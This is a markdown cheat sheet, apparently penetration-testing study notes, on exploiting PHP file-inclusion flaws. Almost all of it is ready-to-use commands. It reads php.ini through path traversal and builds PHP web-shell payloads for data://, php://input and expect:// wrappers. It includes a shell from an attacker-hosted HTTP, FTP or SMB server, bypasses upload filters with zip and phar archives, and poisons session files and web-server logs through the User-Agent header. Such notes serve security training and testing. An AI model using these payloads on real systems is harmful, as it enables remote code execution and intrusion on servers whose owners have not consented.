# PHP Wrappers
## Data Wrapper
## Identifiying
- Identifying allow_url_include
Note: Change the PHP version
```bash
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Decoded
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
- Identifying extension
```bash
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Decoded
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
## Payload
### Data
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
# Example
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
Note: add at the end &cmd=id

### Input
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
### Expect
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

# Remote File Inclusion (RFI)
## Identifiying
- Identifying allow_url_include
Note: Change the PHP version
```bash
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Decoded
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
## Payload
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### HTTP
```bash
python3 -m http.server <LISTENING_PORT>
# Exploit
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### FTP
```bash
python -m pyftpdlib -p 21
# Exploit
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

### SMB
```bash
impacket-smbserver -smb2support share $(pwd)
# Exploit
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

# File Uploads
## Payload
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

## Bypass
### Zip Upload
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# Example
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

```
### Phar Upload
- Shell.php
```bash
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
- Exploit
```bash
# Example
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
# Log Poisoning
## PHP Session Poisoning
if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
- Poisoning session
```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
- Upload payload
```bash
# Payload
<?php system($_GET["cmd"]);?>
# EXPLOIT
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
## Server Log Poisoning
- Common paths
```bash
# Linux
/var/log/apache2/access.log
/var/log/nginx/access.log
# Depending of the services open
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
# Windows
C:\xampp\apache\logs\
C:\nginx\log\ 
```
- We will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning:
<img width="1269" height="730" alt="image" src="https://github.com/user-attachments/assets/c9d4e81c-f54d-4491-9d45-7f9b780d2bae" />

- Payload in User-Agent
Burpsuite
<img width="1268" height="297" alt="image" src="https://github.com/user-attachments/assets/c1d39c08-67c2-4444-b61f-a64b5bd8aafd" />

Curl
```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

- <img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/f0bbd7b5-c834-42fb-81ee-8153f08faaf3" />
